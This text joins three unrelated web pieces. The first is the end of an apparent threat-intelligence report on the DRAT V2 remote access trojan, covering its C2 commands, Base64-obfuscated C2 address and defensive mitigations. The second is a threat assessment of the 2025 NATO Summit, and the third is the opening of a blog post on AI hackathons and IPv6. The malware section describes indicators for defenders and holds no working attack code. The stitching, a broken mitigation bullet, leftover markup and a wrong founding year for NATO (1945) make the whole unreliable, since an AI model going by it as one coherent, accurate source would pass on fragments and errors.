        <p>While both DRAT variants implement similar commands for remote administration, each version uses distinct naming conventions for command headers. For instance, DRAT’s system information command is labeled getInformitica, whereas DRAT V2 uses initial_infotonas. DRAT V2 also introduced a new command, exec_this_comm, which enables arbitrary shell command execution on the infected host, an enhancement not present in the original DRAT and indicative of expanded post-exploitation capabilities. The below comparison table (<strong>Table 2</strong>) presents a detailed, line-by-line breakdown of request and response headers across both versions. In that table, command mappings highlighted in green denote commands that are functionally retained across both variants, while items highlighted in yellow represent new additions exclusive to DRAT V2.</p>

        <h3>Text Format in C2 Communications</h3>
        <p>Both versions leverage text-based communication protocols for C2 interactions. However, they differ in encoding requirements: DRAT V2 accepts commands in both Unicode and ASCII, but always responds in ASCII, whereas the original DRAT mandates Unicode for both input and output (<strong>Figure 6</strong>).</p>

        <h4>Differences in System Information</h4>
        <p>The system information response of both versions includes many similarities, but several differences include the text in Unicode, different command request headers, and WinDefender instead of win-def, both of which are hard-coded. Finally, the format of the Windows version in the system information response varies between DRAT and DRATV2. DRAT simply returns the value from the registry key, Software\Microsoft\Windows NT\CurrentVersion\ProductName, while DRAT V2 gets the Windows version using the API call GetVersionExW() and returns a custom string that is Base64-encoded in the source code. <strong>Table 3</strong> outlines the differences between the two commands.</p>

        <p><strong><em>Table 3:</em></strong> <em>DRAT vs DRAT V2 system information request and response fields (Source: Recorded Future)</em></p>
        <h3>Differences in C2 Obfuscation</h3>
        <p>In both DRAT variants, the C2 information is Base64-encoded. DRAT encodes the C2 IP address directly, while DRAT V2 modifies its approach to C2 obfuscation by prepending one of the following strings to the IP address prior to Base64 encoding:</p>
        <ul>
          <li>&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</li>
          <li>XXXXXXXXXXXXXXXXXXXXXX</li>
        </ul>
        <div>
          <div>
            <div>Example encoded C2 IP with prefix: PD48Pjw+PD48Pjw+PD48Pjw+PD48PjE4NS4xMTcuOTAuMjEy<br />Example decoded C2 IP with prefix: &lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;185.117.90.212</div>
          </div>
        </div>
        <p>These prepended patterns likely serve as rudimentary integrity checks or help prevent trivial decoding by analysts and automated tools.</p>
        <h3>String Obfuscation</h3>
        <p>String obfuscation strategies also differ between the variants. DRAT employs a more extensive scheme, using a substitution algorithm to encode both commands and operational strings. DRAT V2, on the other hand, selectively obfuscates strings, such as Windows version and C2 information, but leaves command headers in plaintext. This limited obfuscation approach in DRAT V2 may represent a trade-off between stealth and parsing reliability.</p>

        <h2>Mitigations</h2>
        <ul>
          <li>Block or monitor outbound TCP connections to uncommon destination ports used by DRAT V2 for C2 operations, such as 3232, 6372, and 7771. Monitor anomalous TCP traffic that does not match known protocols that target high-numbered ports.</li>
          <li>Inspect network traffic for outbound command responses and inbound shell command instructions (<strong>Appendix B</strong>) encoded in Base64, ASCII, or Unicode formats. Emphasize traffic decoding and inspection, especially over TCP sessions established to unusual ports.</li>
          <li>Use the detection rules in this report to identify DRAT V2 execution and persistence via registry run keys, file-based loaders, and encoded C2 patterns. Deploy custom YARA rules to detect both .NET and Delphi-compiled DRAT samples.</li>
          <li>Deploy detection logic to monitor , which invokes remote scripts or launches secondary payloads. This is a key component in the infection chain, where malicious HTA scripts fetch and launch DRAT loaders like BroaderAspect.</li>
          <li>Monitor registry modification events, particularly those involving HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. TAG-140 uses these for persistence by executing DRAT V2 via disguised filenames in C:\Users\Public&lt;/span&gt;.</li>
        </ul>
        <h2>Outlook</h2>
        <p>TAG-140’s deployment of DRAT V2 is consistent with the group’s long-standing practice of maintaining a broad and interchangeable suite of remote access trojans. This continued diversification complicates attribution, detection, and monitoring activity. DRAT V2 appears to be another modular addition rather than a definitive evolution, reinforcing the likelihood that TAG-140 will persist in rotating RATs across campaigns to obscure signatures and maintain operational flexibility.</p>
        <p>Despite these challenges, the DRAT V2 infection chain exhibits limited use of defensive evasion or anti-analysis techniques. The absence of code obfuscation, sandbox evasion, or complex loader behaviors increases the feasibility of early detection through basic telemetry and static analysis. Security teams should anticipate continued experimentation with malware tooling and infection chains. Monitoring for spearphishing infrastructure, loader reuse, and behavioral indicators, rather than specific malware families, will be critical in sustaining visibility into TAG-140 activity.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>On June 24 and 25, 2025, representatives of all 32 members of the North Atlantic Treaty Organization (NATO) will convene in The Hague, the Netherlands, for the 2025 NATO Summit. With each member’s head of state or government in attendance, the summit represents a high-profile diplomatic event taking place amid heightened geopolitical uncertainty and internal alliance tensions. Key issues, such as the ongoing war in Ukraine, economic volatility, rising Euroscepticism, and concern over the United States’ (US) commitment to NATO going forward, are all likely to dominate the agenda.</p>
        <p>The complex geopolitical backdrop of the 2025 NATO Summit almost certainly increases its appeal as a target for a wide spectrum of threat actors, including state-sponsored influence operations groups and cyber threat actors, cybercriminals, and hacktivists. Insikt Group assesses that malign influence operations, cyber-espionage activity, and a measurable uptick in cybercriminal and hacktivist activity likely represent the three primary threat vectors to the 2025 NATO Summit. Russian and Chinese influence networks will almost certainly seek to exploit the summit to amplify perceptions of NATO disunity and undermine its credibility as a reliable security partner. In parallel, Russian state-sponsored cyber actors are highly likely to conduct targeted espionage against NATO-affiliated entities and personnel, while Chinese cyber threat actors are more likely to pursue opportunistic intrusions to glean insight into alliance policies and future planning. Hacktivist and cybercriminal actors are already attempting to capitalize on the summit’s geopolitical visibility for financial gain and political messaging, based on closed forum references to NATO and ongoing targeting of NATO member states.</p>
        <p>Security officials are simultaneously preparing extensive physical security measures to safeguard the event. While direct attacks on the summit by Russian hybrid actors –– encompassing conventional and irregular military forces –– are unlikely, tactics such as sabotage, vandalism, weaponized migration, and provocative military signaling will very likely continue to pressure NATO member states around the time of the event, particularly allies in Eastern Europe. At the time of publication, Insikt Group assesses that protests during the summit are very likely, but risks associated with protest activities are largely mitigated through proactive security measures. Additionally, we have not observed any credible evidence suggesting that violent non-state actors are planning or expressing intent to target the summit.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>We assess NATO’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility, rising political influence of Eurosceptic far right parties in several NATO member states, and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine and hybrid sabotage and influence operations in Europe.</li>
          <li>Russian hybrid threats, including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posturing, will very likely continue to target European countries ahead of and following the 2025 NATO Summit, particularly if the summit results in significant action regarding Ukraine –– with the Baltic states, Poland, and Germany likely at highest risk.</li>
          <li>Both Russia and China’s own influence ecosystems will almost certainly attempt to shape public opinion around the 2025 NATO Summit by portraying the alliance as aggressive, divisive, and divided.</li>
          <li>Malign influence actors, particularly from Russia, are likely to use artificial intelligence (AI)-generated media in an effort to discredit NATO leadership, delegitimize summit outcomes, and further inflame tensions among member states.</li>
          <li>Cybercriminal and hacktivist activity referencing NATO has surged across dark web and special-access forums in the months leading up to the 2025 NATO Summit, very likely signaling a heightened risk of ideologically driven and financially motivated multi-vector campaigns targeting NATO member states and defense-affiliated entities.</li>
          <li>Russian state-aligned threat groups, particularly those linked to the SVR, FSB, and GRU, are highly likely to conduct targeted operations against entities and personnel associated with the 2025 NATO Summit.</li>
          <li>Chinese state-sponsored groups tasked with the collection of foreign intelligence, particularly those under the Ministry of State Security, are likely to engage in some level of opportunistic cyber-espionage operations against select attendees with the goal of understanding summit-related policy discussions and outcomes.</li>
          <li>The Netherlands’ extensive security posture around the 2025 NATO Summit will very likely mitigate the scope, sophistication, and impact of physical security threats to the event from violent non-state actors, including terrorists, violent extremists, criminal organizations, and disruptive protest movements.</li>
        </ul>
        <h2>Strategic Threat Environment</h2>
        <p>2025 NATO Summit Likely Pivotal for Alliance’s Future Unity</p>
        <p>The 2025 NATO Summit comes at a time when the alliance’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility; rising political influence of Euroskeptic far right parties in several NATO member states; and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine, and hybrid sabotage and influence operations in Europe.</p>
        <p>The US government’s public messaging concerning its commitment to NATO has been inconsistent throughout President Donald Trump’s first and second terms. In 2025, President Trump suggested that the US’s commitment to Article 5 of NATO’s founding treaty would depend on a given NATO state’s defense spending, <a href="https://www.theguardian.com/us-news/2025/mar/07/donald-trump-nato-alliance-us-security-support">stating</a>, “If they don’t pay, I’m not going to defend them.” In contrast, in 2017, President Trump <a href="https://www.atlanticcouncil.org/blogs/natosource/exclusive-trump-discovers-article-5-after-disastrous-nato-visit/?utm_source=chatgpt.com">stated</a>, “Absolutely, I’d be committed to Article 5.”</p>
        <p>Secretary of State Marco Rubio <a href="https://kyivindependent.com/nato-funding-explained-as-trump-mulls-cuts/">announced</a> that all NATO members will be expected to spend 5% of their GDP on defense over the next decade, an increase from the previous benchmark of 2%. Although Rubio emphasized that the US remains committed to supporting NATO, notes from an internal Trump Administration proposal <a href="https://apnews.com/article/state-department-funding-cuts-trump-diplomacy-8305713dc6da1b95811486b62bf46582">revealed</a> plans to reduce the amount of money the US would contribute to NATO’s budget. The US currently <a href="https://www.nato.int/cps/uk/natohq/topics_67655.htm?selectedLocale=en">provides</a> roughly 16% of the alliance’s funding.</p>
        <p>In some key NATO states, the rising political <a href="https://carnegieendowment.org/research/2024/04/charting-the-radical-rights-influence-on-eu-foreign-policy?center=russia-eurasia&amp;lang=en">influence</a> of far-right parties that are skeptical of NATO and sympathetic to Russia likely complicates their ability to reinforce NATO commitments. For example, France’s Rassemblement National (RN) has historically advocated for France’s withdrawal from NATO. Though the RN has recently moderated its position, its historically anti-NATO position risks complicating French President Emmanuel Macron’s ability to achieve consensus on increased French defense spending for NATO. Germany’s Alternative für Deutschland (AfD) has questioned NATO’s continued utility and has advocated for closer Germany-Russia ties.</p>
        <p>Differences in NATO states’ probable responses to Russia’s multi-pronged attempts to weaken NATO and its allies will almost certainly strain NATO’s ability to project a unified response to Russia’s actions. Though NATO has, from its founding in 1945, been primarily concerned with resisting Russian aggression, in the last two years, Russia has significantly escalated its aggression towards NATO and its allies, with Moscow’s full-scale invasion of Ukraine, escalating sabotage operations in NATO territory, and widespread influence operations aimed at undermining public confidence in Western democracy and manipulating elections in favor of pro-Russia candidates.</p>
        <h4>Profiles of Key Players</h4>
        <h5>United States — Unpredictable NATO Leader</h5>
        <p>Inconsistent statements by senior US officials about NATO’s utility and how much to resist Russian aggression likely make it difficult to predict the US’s 2025 NATO Summit priorities, which will have significant influence over the tone of the summit and the text of the Summit Declaration. That said, the US almost certainly will <a href="https://www.heritage.org/global-politics/report/what-success-story-looks-top-us-priorities-the-june-2025-nato-summit-the">call</a> for NATO member states to spend 3.5 to 5% of their GDP on defense, judging from <a href="https://www.straitstimes.com/world/united-states/trump-says-nato-members-should-raise-defence-spending-to-5-of-gdp?utm_source=chatgpt.com">past</a> statements by President Trump. The US is also likely to push for NATO’s increased focus on China-nexus threats to NATO territory, judging from the Trump administration’s emphasis on resisting Chinese global aggression. The US’s inconsistent policies toward Russia — ranging from <a href="https://www.bbc.com/news/articles/cg5q0mev07lo">supporting</a> Russia’s view that Kyiv started the Russia-Ukraine war to <a href="https://www.cnn.com/2025/05/27/politics/russia-sanctions-trump-ukraine-war">calling</a> for additional sanctions on Russia — make it difficult to predict the US’s stance on Russia at the summit. <a href="https://www.euractiv.com/section/defence/news/nato-plans-to-sideline-zelenskyy-at-june-summit-to-keep-trump-happy/">Reporting</a> suggests senior NATO officials — including the NATO Secretary General — are considering deemphasizing Ukraine at the summit, potentially including not inviting Ukrainian President Volodymyr Zelensky, to avoid alienating President Trump. We assess this suggests that at least some NATO states might be willing to compromise on their priorities to ensure the US remains invested in the alliance.</p>
        <h5>Poland — Concerns about Existential Threats from Moscow Drive Militarization</h5>
        <p>Poland’s presidential election likely raises questions about Warsaw’s level of support for Ukraine at the 2025 NATO Summit and beyond. Law and Justice (PiS) candidate Karol Nawrocki won the runoff on June 2, 2025. Nawrocki has stated that he would veto Ukraine’s accession to NATO, suggesting Warsaw is likely to be less inclined to support additional NATO aid to Ukraine. However, Nawrocki is likely to remain committed to building up Poland’s military capabilities to resist Russian aggression. Warsaw’s history of being invaded by Russia and Putin’s <a href="https://www.legal-tools.org/doc/tt382m/pdf">rhetoric</a> undermining Poland’s sovereignty almost certainly have led Poland to conclude that NATO strength is one of the only deterrents to Russian aggression within Poland, potentially including territorial incursions. Polish leaders have <a href="https://www.politico.eu/article/donald-tusk-plan-train-poland-men-military-service-russia/">announced</a> plans to increase the size of Poland’s standing army from 200,000 to 500,000 and provide military training to every Polish man.</p>
        <h5>United Kingdom — Member of Pro-NATO Unity Bloc</h5>
        <p>The United Kingdom (UK) is likely to strongly <a href="https://www.gov.uk/government/speeches/prime-ministers-oral-statement-to-the-house-of-commons-25-february-2025?utm_source=chatgpt.com">advocate</a> for continued NATO unity to resist threats, including an increase in NATO assistance to Ukraine. The UK has announced a commitment to increase its defense spending to 2.5% of its GDP by 2030. Notably, UK Prime Minister Keir Starmer has <a href="https://www.bbc.com/news/articles/clyelpzqn28o">backed</a> NATO membership for Ukraine despite US objections, suggesting there could be tension between the US and UK on this issue at the summit.</p>
        <h5>Germany — Member of Pro-NATO Unity Bloc</h5>
        <p>Germany is likely to be more committed to NATO unity and increased defense spending than it has in previous NATO summits, as it adopts a position similar to that of the UK and France. Senior German officials have <a href="https://www.reuters.com/world/berlin-backs-trumps-demand-hike-nato-spending-target-5-2025-05-15/?utm_source=chatgpt.com">pledged</a> to spend 5% of Germany’s GDP on defense. Merz’s government <a href="https://responsiblestatecraft.org/german-defense-spending-increase/">voted</a> to revise Germany’s constitution to allow increased defense spending and facilitate the largest German rearmament since World War II. Chancellor Merz has also expressed support for Ukraine joining NATO, though he has rejected the idea of sending NATO troops to Ukraine.</p>
        <h5>France — Member of Pro-NATO Unity Bloc</h5>
        <p>France’s position at the 2025 NATO Summit is likely to be broadly similar to that of the UK and Germany. French President Emmanuel Macron has <a href="https://www.politico.eu/article/macron-urges-europe-to-boost-defense-spending-to-over-3-percent-of-gdp/">advocated</a> for NATO states to increase their defense spending to 3 to 3.5% of their GDPs. France has <a href="https://www.france24.com/en/europe/20250311-european-nato-paris-ukraine?utm_source=chatgpt.com">called</a> for “credible security guarantees” for Ukraine via a coordinated NATO <a href="https://www.lemonde.fr/en/europe/article/2025/03/11/macron-hosts-military-chiefs-from-30-countries-to-discuss-ukraine_6739036_143.html?utm_source=chatgpt.com">strategy</a>, including a pathway for Ukraine to join NATO. Macron is also likely to <a href="https://www.military.com/daily-news/2025/03/04/macron-discuss-nuclear-deterrence-european-allies-look-frances-unique-strategy.html?utm_source=chatgpt.com">advocate</a> for the expansion of nuclear deterrence measures to strengthen NATO’s defenses.</p>
        <h5>Hungary — Efforts to Balance NATO Membership with Close Russia Relations Complicate NATO Unity</h5>
        <p>Hungary is likely to take a multifaceted approach that aims to balance participation in core NATO functions, including defense spending targets and collective defense mechanisms, with avoiding providing direct military assistance to Ukraine, likely to preserve Hungary’s relationship with Russia. Hungary has <a href="https://www.belfercenter.org/publication/us-engagement-hungary-reshaping-natos-collective-alliance?utm_source=chatgpt.com">met</a> NATO’s longtime 2% defense spending target, though its efforts to maintain a positive relationship with Russia are likely to complicate NATO’s ability to project a unified response to Russian aggression. Hungary’s plans to <a href="https://www.gbnews.com/news/world/viktor-orban-hungary-nato-membership?utm_source=chatgpt.com">determine</a> a way to avoid operations outside of NATO territory suggest it could complicate NATO responses to conflicts, even outside of the Russia-Ukraine war.</p>
        <h5>Türkiye — Pivotal Independent Player, Most Well-Positioned to Influence NATO Priorities</h5>
        <p>Türkiye’s strong military and unique diplomatic positioning to broker talks with Western powers as well as Russia and China means it likely feels empowered to push NATO to adopt Turkish priorities. For example, Türkiye initially <a href="https://foreignpolicy.com/2024/01/28/turkey-sweden-nato-erdogan-foreign-policy-history-us-europe-west/">opposed</a> Swedish admission into NATO due to Sweden providing asylum for members of the Kurdistan Workers’ Party, a political party Ankara considers a terrorist organization. Türkiye eventually <a href="https://www.npr.org/2024/01/27/1227418505/f-16s-turkey-sweden-nato-kurds-greece">agreed</a> to Swedish admission into NATO after securing key concessions from the US, including F-16 fighter jets.</p>
        <p>Türkiye <a href="https://breakingdefense.com/2024/10/turkish-defense-spending-to-reach-record-high-amid-neighboring-conflicts/">announced</a> plans in October 2024 to increase its defense and security spending in 2025 to $47 billion, its highest-ever military budget. Ankara has <a href="https://www.straitstimes.com/world/europe/turkey-ready-to-host-russia-ukraine-peace-talks-erdogan-tells-putin?utm_source=chatgpt.com">offered</a> up its services as a mediator in the Russia-Ukraine war, though Ankara’s often close relations with Moscow make it unclear to what extent Türkiye would be able to be a neutral arbiter between Moscow and Kyiv. More broadly, Türkiye is likely to seek NATO support for its own national priorities, including counterterrorism, as well as a lifting of NATO arms embargoes on Türkiye, which Ankara <a href="https://nordicmonitor.com/2024/07/erdogan-seeks-lifting-of-unofficial-embargoes-on-turkey-at-nato-summit/?utm_source=chatgpt.com">argues</a> undermines Turkish defense capabilities.</p>
        <h3>Hybrid Threats to NATO Member States</h3>
        <p>Russian hybrid threats –– including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posture –– will very likely continue to target European countries ahead of and following the 2025 NATO Summit. While these operations are unlikely to directly target the summit event itself, threats to the critical infrastructure of NATO member countries are likely heightened as Moscow seeks to destabilize member states and exploit divisions within the alliance. Hybrid threats will almost certainly increase their targeting of NATO member countries following the summit if it results in significant action regarding Ukraine, such as a joint commitment to further military aid to Kyiv. In January 2025, the Finnish Defence Forces <a href="https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf">assessed</a> that Russia “will likely increase the use of all hybrid methods as it seeks to cause disunity within NATO and the European Union,” including cyber and information influencing, coercive use of energy exports, targeting of energy and other critical infrastructure, weaponizing immigration, and intelligence operations.</p>
        <h4>Russian Hybrid Warfare Units</h4>
        <p>Insikt Group identified at least five Russian units dedicated to hybrid warfare operations, including sabotage, assassinations, arson attacks, espionage, and recruitment of foreign agents (<strong>Table 1</strong>). The Kremlin also very likely <a href="https://www.mi5.gov.uk/director-general-ken-mccallum-gives-latest-threat-update">employs</a> individuals not directly affiliated with its security or intelligence services to <a href="https://tvn24.pl/plus/programy/czarno-na-bialym/szpiedzy-w-polsce-czy-wobec-takiego-zagrozenia-jestesmy-bezradni-reportaz-piotra-swierczka-vc8358848">conduct</a> hybrid threat activity, in an effort to prevent discovery and complicate attribution. For example, GRU Military Unit 54654 very likely recruits operatives without prior military contracts or connections to the Russian government to avoid identification, including recruiting foreign students studying in Russia, Russian students abroad, and criminal organizations in Russia and abroad.</p>
        <p>Recent arrests and incidents of potential sabotage across Europe <a href="https://www.politico.eu/article/europe-russia-hybrid-war-vladimir-putin-germany-cyberattacks-election-interference/">indicate</a> that recruits are largely young men, Russian-<a href="https://www.theguardian.com/technology/2025/mar/18/russia-criminal-networks-drive-increase-sabotage-europol">speaking</a> but not Russian citizens, <a href="https://www.cia.gov/static/DCIA_Bill_Burns_MI6_Chief_Richard_Moore_with_FT_Editor_Roula_Khalaf_Transcript.pdf">often</a> with a criminal background and <a href="https://www.occrp.org/en/investigation/make-a-molotov-cocktail-how-europeans-are-recruited-through-telegram-to-commit-sabotage-arson-and-murder">recruited</a> via Telegram. For example, Polish Foreign Minister Radek Sikorski <a href="https://www.bbc.com/news/videos/ceqgxv7ejxwo">stated</a> in an interview that Russia used Telegram to recruit the perpetrators of the May 2024 arson attacks on a Warsaw shopping mall. In March 2025, the Finnish Defence Forces <a href="https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf">assessed</a> that “attempts to recruit human sources online, and particularly on pro-Russian social media platforms, are likely to become more common.” Similarly, Moscow can also likely co-opt vessels affiliated with its shadow fleet to conduct low-sophistication destructive actions targeting submarine infrastructure, such as anchor dragging, as these assets likely draw less scrutiny.</p>

        <h5>Sabotage</h5>
        <p>Russia very likely aims to target European critical infrastructure with hybrid cyber-kinetic operations, regardless of the outcome of current peace negotiations on Ukraine. Based on recent incidents, countries neighboring Russia –– Estonia, Finland, Latvia, Lithuania, and Poland –– likely <a href="https://jamestown.org/program/poland-on-the-frontlines-against-russias-shadow-war/?utm_source=All+Subscribers&amp;utm_campaign=cf94211450-EMAIL_CAMPAIGN_2025_02_14_07_49_COPY_01&amp;utm_medium=email&amp;utm_term=0_-a46e3b4ee2-155273798&amp;mc_cid=cf94211450&amp;mc_eid=1d39ed9d2e">represent</a> the most attractive targets for sabotage operations. Additionally, countries providing the strongest support to Ukraine, such as Germany and Poland, are almost certainly at greater risk of physical threats than countries that do not provide significant aid, such as Hungary, which Moscow is unlikely to directly target. Specifically, Insikt Group assessed in April 2025 that Russia’s threat perception and intent to target European energy entities would likely increase following the European Union (EU)’s <a href="https://commission.europa.eu/news/roadmap-fully-end-eu-dependency-russian-energy-2025-05-06_en">announcement</a> of a framework to eliminate Russian fossil fuel imports by 2027.</p>
        <p>Russia-directed sabotage attacks targeting the critical infrastructure and key government and military facilities of European countries have almost certainly <a href="/research/russian-sabotage-activities-escalate-amid-fraught-tensions">increased</a> since 2022. Recent incidents suggest that these operations largely involve low-sophistication tactics with a degree of plausible deniability and obfuscated links to Moscow, often initially appearing as accidents or single criminal events, complicating attribution and identification of a larger strategic trend. For example, in March 2025, Polish prosecutors <a href="https://www.politico.eu/article/russia-spy-belarusian-refugee-warsaw-mall-fire-prosecutor/">announced</a> that an alleged Belarusian refugee masquerading as an opposition activist had set fire to a Warsaw supermarket on Russia’s behalf in April 2024, and Lithuanian prosecutors <a href="https://www.bbc.com/news/articles/c757kpk21d9o">attributed</a> an arson attack on an Ikea store in Vilnius in May 2024 to two teenagers recruited by Russia’s Main Directorate of the General Staff of the Armed Forces (GRU). In December 2024, the Federal Prosecutor’s Office in Germany announced charges against three Russian-German nationals for reportedly surveying a US military base in Grafenwöhr, a weapons factory in Bayreuth, and military facilities and railway lines to support sabotage operations using explosives. According to the Center for Strategic and International Studies (CSIS), Russia-directed sabotage attacks in Europe <a href="https://www.csis.org/analysis/russias-shadow-war-against-west">tripled</a> between 2023 and 2024 (from 12 to 34 attacks), after quadrupling between 2022 and 2023 (from 3 to 12 attacks).</p>
        <h5>Threats to Submarine Cable Infrastructure</h5>
        <p>Sabotage operations targeting submarine cables off the coast of Europe almost certainly represent a relatively low-effort, high-reward vector for targeting European critical infrastructure. In June 2023, Insikt Group <a href="/research/escalating-global-risk-environment-submarine-cables">assessed</a> that Russia’s ongoing war against Ukraine was very likely fueling physical attacks and intelligence collection efforts against the submarine cable system to undermine the economic, diplomatic, and national security objectives of the US and its NATO allies. Specifically, Russia almost certainly presents the greatest direct threat to submarine cables in the North and Baltic Seas.</p>
        <p>Insikt Group identified four incidents involving damage to eight submarine cables in the Baltic Sea in 2024 and 2025: January 2025 <a href="https://www.svt.se/nyheter/utrikes/uppgifter-om-nytt-kabelbrott-i-ostersjon">damages</a> to the C-Lion1 cable connecting Germany and Finland; January 2025 <a href="https://www.svt.se/nyheter/utrikes/lettland-utreder-sabotage-efter-kabelbrott-utanfor-gotland">damages</a> to the Sweden-Latvia cable; December 2024 <a href="https://www.theguardian.com/world/2024/dec/26/finnish-coastguard-boards-eagle-s-oil-tanker-suspected-of-causing-power-cable-outages">damages</a> to four submarine internet cables (likely the Finland Estonia Connection 1, Finland Estonia Connection 2, Baltic Sea Submarine Cable, and C-Lion1) and the Estlink-2 power cable; and November 2024 damages to the C-Lion1 and BCS East-West Interlink. Prosecutors have attributed these damages to vessels, some with connections to Russia, dragging their anchors; for example, the Eagle S vessel behind the December 2024 cable cuts is <a href="https://www.lloydslist.com/LL1151955/Russia-linked-cable-cutting-tanker-seized-by-Finland-was-loaded-with-spying-equipment">suspected</a> to be part of Russia’s shadow fleet and reportedly carried surveillance equipment. While none of these incidents caused prolonged outages or communication disruptions due to the availability of alternate routes for data transmission, increased societal concerns about the vulnerability of critical infrastructure had a <a href="https://www.rand.org/pubs/commentary/2025/01/countering-russias-shadow-fleet.html">clear</a> <a href="https://katsaus.supo.fi/en/russian-sabotage-in-europe">psychological</a> <a href="https://news.postimees.ee/8255914/vox-populi-of-political-parties-lauri-laanemets-if-russian-ships-reach-estonian-waters-it-is-too-late?cx_testId=25&amp;cx_testVariant=cx_1&amp;cx_artPos=0#cxrecs_s">impact</a> on northern European populations. A more coordinated attack on submarine critical infrastructure could cause disruptions to business operations, financial losses, and communications disruptions, raising the risk of economic ramifications to northern and eastern Europe. In 2024, Estonian power provider Elering <a href="https://www.politico.eu/article/russia-sabotage-undersea-cables-baltic-sea-europe-war/">reported</a> that energy bills spiked by 10% due to a technical problem with a power cable, with board member Erkki Sapp stating that energy infrastructure can handle any single event, but “if there are several of these sorts of events, then this may lead to issues with security of supply.”</p>
        <p>In addition to threats to critical infrastructure, Moscow has very likely attempted to <a href="https://mwi.westpoint.edu/weaponized-migration-in-eastern-europes-frozen-north-do-not-overlook-russian-hybrid-warfare/">weaponize</a> refugee flows in an effort to foment domestic unrest and exploit concerns about immigration in countries bordering Russia and Belarus. In October 2024, Poland temporarily <a href="https://www.politico.eu/article/poland-prime-minister-donald-tusk-eu-asylum-ban-russia-belarus-migration-security/">suspended</a> asylum rights for migrants entering the country via Belarus, over concerns that Russia had orchestrated an influx of migrants at that border as part of hybrid tactics to destabilize Poland. Similarly, Finland <a href="https://apnews.com/article/finland-russia-border-migration-313b2a1846f4aa4b349fa577ce8c39a4">closed</a> its last border crossing with Russia in November 2023 after accusing Moscow of facilitating the crossing of approximately 1,000 migrants without valid documentation. Throughout 2021 and 2022, Lithuania <a href="https://warsawinstitute.org/tightening-immigration-and-border-policy-initiatives-in-the-baltics/">documented</a> similar efforts by the Belarusian government to push migrants across the border. As such, the weaponization of migration across Russian and Belarusian borders with NATO member states, particularly Finland, Poland, Estonia, Latvia, and Lithuania, likely remains a viable tactic to attempt to destabilize these countries.</p>
        <h5>Coercive Military Posture</h5>
        <p>Russia’s plans to expand its military capabilities near the border with Finland and the Baltic states will very likely focus on increasing military presence and intelligence capabilities. Moscow’s ability to implement these changes has been constrained by its ongoing military operations in Ukraine, although it has already taken several key steps in 2024 –– most notably, the creation of the Leningrad Military District bordering Finland and the Baltics, which Moscow frames as its response to NATO expansion. Russia reportedly <a href="https://www.thebarentsobserver.com/news/kola-and-in-karelia-likely-to-get-tens-of-thousands-of-new-soldiers/423579#:~:text=A%20completely%20new%20army%20corps,the%2080th%20Motorised%20Infantry%20Brigade">aims</a> to increase the size of its armed forces by 350,000 by 2026, of which up to 50,000 will deploy to the Leningrad Military District, potentially <a href="https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html">increasing</a> troop numbers near Finland from approximately 30,000 to 80,000. While Finnish and Latvian intelligence services <a href="https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html">have</a> <a href="https://eng.lsm.lv/article/society/defense/06.05.2025-latvias-intelligence-service-russia-is-undergoing-military-reform.a597782/">assessed</a> that planned troop increases will not be completed for several years, Russia will very likely seek to ramp up implementation of military reforms should the conflict in Ukraine decrease in intensity, focusing on increasing military presence and capabilities in its northwestern regions.</p>
        <p>In addition to expanding its military capabilities along NATO member state borders, Russian coercive military actions via incursions into NATO airspace will also likely increase ahead of the 2025 NATO Summit. In April 2024, the foreign ministers of Estonia, Latvia, Lithuania, Finland, and Sweden met to discuss growing global positioning system (GPS) interference in the region, which Estonian Foreign Minister Margus Tsahkna attributed to Russia and which Insikt Group assessed would continue through then-ongoing STEADFAST DEFENDER 2024 military exercises. In its annual report in May 2025, Latvia’s Military Intelligence and Security Service (MIDD) <a href="https://eng.lsm.lv/article/society/defense/06.05.2025-latvias-intelligence-service-russia-is-undergoing-military-reform.a597782/">reported</a> that Russia has increasingly been monitoring NATO activity in the Baltic Sea and engaging in acts such as unauthorized airspace violations, in a likely attempt to intimidate, test NATO responses, and discredit regional defense capabilities.</p>

        <h2>AI Hackathons and the Future of Security Architecture</h2>
        <p>Last week, a few <a href="/work-with-us">Futurists</a> met up to work out the practical realities of AI-enabled Red Teaming (among other topics). In addition to two days of phenomenal vibe coding in <a href="https://www.cursor.com/">Cursor</a>, the final presentations were light on hyperbole and heavy on capabilities and remarkable outcomes, created in a day or less. Two years ago, when LLMs made their mainstream debut, I was dubious, but the hackathon confirmed recent observations (last three months) that AI is accelerating security workflows (like everything else) at warp speed. Change, soon driven primarily through various agentic flavors, is happening at a pace that is difficult to comprehend.</p>
        <p>The flight home was spent considering how to get ahead of the adversarial/defensive agent wars that will soon play out across the internet. Given the vast amount of uncertainty in agentic implementations and scale, there are no perfect solutions, but there are architecture scenarios worth considering NOW. Principal among them is <a href="https://networklessons.com/ipv6/introduction-to-ipv6">IPv6</a>. Long a headache for architects and engineers (nibble boundaries anyone?), IPv6 may now represent real business value through security, in exchange for the considerable effort. AI is a natural forcing function here. Given the time required to implement IPv6 and resolve the inevitable challenges along the way, enterprises should begin the work, aided by AI, of course.</p>
        <h2>Why IPv6 Belongs in Your Five-Year Security Roadmap</h2>
